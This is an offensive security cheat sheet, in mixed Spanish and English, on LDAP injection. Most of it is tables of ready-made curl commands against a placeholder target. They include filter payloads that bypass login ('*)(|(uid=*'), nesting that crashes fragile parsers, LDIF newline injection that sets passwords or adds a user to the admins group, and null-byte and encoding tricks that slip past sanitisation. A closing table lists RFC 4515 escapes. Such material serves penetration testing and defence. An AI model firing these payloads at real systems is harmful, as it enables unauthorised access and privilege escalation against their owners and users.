---
aliases:
  - LDAP Filter Injection
  - AND OR Injection
  - LDAP Comments
tags:
  - type/cheatsheet
  - vuln/ldap-injection
  - technique/initial-access
  - asset/web-app
  - asset/directory-service
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[LDAP Injection]]'
---
# LDAP Injection - Filter Manipulation

***

## AND / OR Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=*)(&(uid=admin)&password=any" https://target/login` | Force AND con uid=admin specific | Filter `(&(uid={u})(pass={p}))`. |
| `curl -d "username=*)(\|(uid=*&password=any" https://target/login` | Force OR — match all users | Standard auth bypass. |
| `curl -d "username=*)(!(uid=admin)(uid=*&password=any" https://target/login` | Negation — match all NON-admins | Find non-admin users. |
| `curl --data-urlencode "username=*)(\|(\|(uid=*" --data-urlencode "password=any" https://target/login` | Universal true (always matches) | Compound OR. |
| `curl -d "username=*)(\|(uid=*))(\|(uid=admin)&password=any" https://target/login` | Override filter logic completo | Replace original filter. |
| `curl --data-urlencode "username=*)(\|(uid=a)(uid=b)(uid=c)(uid=d))" --data-urlencode "password=any" https://target/login` | Multi-target enum en una request | Multi-OR brute. |
| `curl -d "username=*)(&(memberOf=cn=admins,dc=target,dc=com)(uid=*&password=any" https://target/login` | Constrained search — solo admins | AND con memberOf. |
| `curl -d "username=*)(&(uid=*)(!(uid=admin))&password=any" https://target/login` | Find non-admin users (negation) | Negation enum. |
^ldap-filter-andor

### Filter inyectado vs original

```
Original: (&(uid={user})(password={pass}))

Injection: user = *)(|(uid=*       pass = *)(|(uid=*

Result:    (&(uid=*)(|(uid=*))(password=*)(|(uid=*)))
            ^ matches everyone, ambos segments OR=true
```

___

## Nested Filters

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl --data-urlencode "username=*)(\|(role=admin)(role=manager))" --data-urlencode "password=any" https://target/login` | Nested OR within AND | Filter complejo. |
| `curl --data-urlencode "username=*)(\|(&(uid={u})(active=true))(&(uid={u})(emergency=true)))" -d "password=any" https://target/login` | Nested AND within OR | Multi-condition bypass. |
| `curl -d "username=((((((((&password=any" https://target/login` | Stack overflow / DoS via nesting | Server con parser frágil. |
| `curl -d "username=(((uid=*)&password=any" https://target/login` | Mismatch parens — error o tolerated | Server differential. |
| `curl --data-urlencode "username=*)(uid=*)(emergency=*)" -d "password=any" https://target/login` | Inject 3rd filter — bypass conditions | Filter compound trick. |
^ldap-filter-nested

___

## LDAP Attribute Injection (Add/Modify)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl --data-urlencode "name=John%0auserPassword: ATTACKER" -d "email=x@y.z" https://target/register` | LDIF injection — agregar password al user creado | App permite registration via LDAP modify. |
| `curl --data-urlencode "name=John%0amemberOf: cn=admins,dc=target,dc=com" https://target/profile/update` | Self-add a admins group | Profile update sin sanitización LDIF. |
| `curl --data-urlencode "name=John%0a-%0aadd: userPassword%0auserPassword: NEWPASS" https://target/profile/update` | Multi-operation LDIF inject | Modify operation con multi-step. |
| `curl --data-urlencode "name=$(printf 'John\nuserPassword: x')" https://target/register` | Newline literal en bash | Server-side LDIF construction. |
| `curl --data-urlencode "name=John%0d%0auserPassword: x" https://target/register` | CRLF injection variant | Some parsers strip LF only. |
^ldap-filter-attribute

___

## LDAP Comments y Null-Byte

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl --data-urlencode "username=admin%00trailing" -d "password=x" https://target/login` | Null byte truncation post-admin | Parser web layer trunca en NUL. |
| `curl --data-urlencode "username=admin%5c00&password=x" https://target/login` | LDAP-encoded NUL `\00` | Filter injection con encoded NUL. |
| `curl --data-urlencode "username=admin%5c2a&password=x" https://target/login` | LDAP-encoded wildcard `\2a` (literal `*`) | Bypass app sanitization. |
| `curl --data-urlencode "username=admin%5c28%5c29&password=x" https://target/login` | Encoded `\28\29` (literal `()`) | Double-encoding bypass. |
| `curl --data-urlencode "username=admin%2520%29%28uid%3D%2A&password=x" https://target/login` | Doble URL-encoded → decoded twice → injection | Multi-decode parsers. |
| `curl --data-urlencode "username=admin%09)(uid=*&password=x" https://target/login` (tab) | Whitespace bypass | App strip espacios pero no tabs. |
^ldap-filter-comments

### LDAP filter character escaping (RFC 4515)

| Char | Escape |
|---|---|
| `*` | `\2a` |
| `(` | `\28` |
| `)` | `\29` |
| `\` | `\5c` |
| NUL | `\00` |

***
